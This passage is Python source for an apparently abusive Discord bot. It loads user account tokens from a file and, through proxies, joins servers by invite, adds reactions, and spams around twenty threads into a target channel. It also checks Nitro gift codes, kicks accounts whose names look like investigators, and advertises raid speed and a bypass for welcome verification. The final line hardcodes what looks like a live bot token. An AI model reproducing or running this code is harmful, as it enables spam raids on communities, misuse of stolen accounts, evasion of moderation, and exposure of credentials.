    if ctx.channel.id != 966774179728879666:
      embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666>',
      color=color
      )
      a = await ctx.send(embed=embed)
      await asyncio.sleep(3)
      await a.delete()
    else:
      link2 = invite.split('/')
      embed = discord.Embed(title='Adding Reaction', description=f'Adding Reactions to message {messageid} in {link2[3]}!',color=color)
      await ctx.send(embed=embed)
      channelGet = bot.get_channel(LogsChannel)
      embed = discord.Embed(title='Sending Reactions', description=f'T0ken -----------\nMessageID: {messageid}\nChannelID: {channel} \n This t0ken is working!',color=color)
      await channelGet.send(embed=embed)
      await channelGet.send(ctx.author.mention)
      r = open('tokens.txt', 'r')
      r2 = r.readlines()
      a = (random.choice(r2))
      b = a.strip('\n')
      headers = {
        "Authorization": b,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
      }
      leavePayload = {
        "lurking": False
      }
      r = requests.post(f'https://discord.com/api/v9/invites/{link2[3]}', headers=headers,proxies=proxies)
      await asyncio.sleep(12)
      r2 = requests.put(f'https://discord.com/api/v9/channels/{channel}/messages/{messageid}/reactions/{emoji}/%40me',headers=headers)
      print(r2.text)
      await asyncio.sleep(10)
      leaveguild3 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r.json()['guild']['id']}",headers=headers, json=leavePayload)
 
@bot.command()
async def threadspam(ctx, invite, channelid,  threadname):
    if ctx.channel.id != 966774179728879666:
      embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666>',
      color=color
      )
      a = await ctx.send(embed=embed)
      await asyncio.sleep(3)
      await a.delete()
    else:
        link2 = invite.split('/')
        embed = discord.Embed(title='Spamming Threads', description=f'Spamming 10 Threads in {link2[3]}',color=color)
        await ctx.send(embed=embed)
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Sending Threads', description=f'Spamming 10 Threads in {link2[3]}',color=color)
        await channelGet.send(embed=embed)
        r = open('tokens.txt', 'r')
        r2 = r.readlines()
        a = (random.choice(r2))
        b = a.strip('\n')
        headers = {
          "Authorization": b,
        }
        payload = {
          "auto_archive_duration": 1440,
          "location": "Thread Browser Toolbar",
          "name": threadname,
          "type": 11
        }
        r = requests.post(f'https://discord.com/api/v9/invites/{link2[3]}', headers=headers,proxies=proxies)
        await asyncio.sleep(10)
        for i in range(1,20):
          r = requests.post(f'https://discord.com/api/v9/channels/{channelid}/threads',headers=headers, json=payload, proxies=proxies)
          await asyncio.sleep(.2)
 
 
@bot.command()
async def nitrochecker(ctx, nitro):
  nitrosplit = nitro.split('/')
  r = requests.get(f'https://discordapp.com/api/v9/entitlements/gift-codes/{nitrosplit[1]}?with_application=false&with_subscription_plan=true')
  print(r.text)
  await ctx.send(r.text)
  await ctx.send(r.json()["message"])
 
@bot.event
async def on_member_join(member):
  if "/tokenz" in member.name or "oCPMyu" in member.name or "Detective Vokens" in member.name or "Craigsmvp" in member.name:
    await member.kick()
  else:
    pass
 
 
@bot.event
async def on_guild_join(guild):
  await guild.leave()
 
@bot.command()
@commands.is_owner()
async def kalt(ctx):
  for member in ctx.guild.members:
    if "Detective Vokens" in member.name or "Craigsmvp" in member.name:
      await member.kick()
    else:
      pass
 
@bot.command()
async def updates(ctx):
  embed = discord.Embed(title='Updates', description='Increased Speed For R4id to 30 Per Second\nFixed bug with logs not working \nAdded Bypass For Welcome Verification',color=color)
  await ctx.send(embed=embed)
 
bot.run("ODg5NTI0OTA1NDU0OTkzNDA4.YUigoA.u7rN_o0dKKb_DjA4XNdgGTQvRAk")
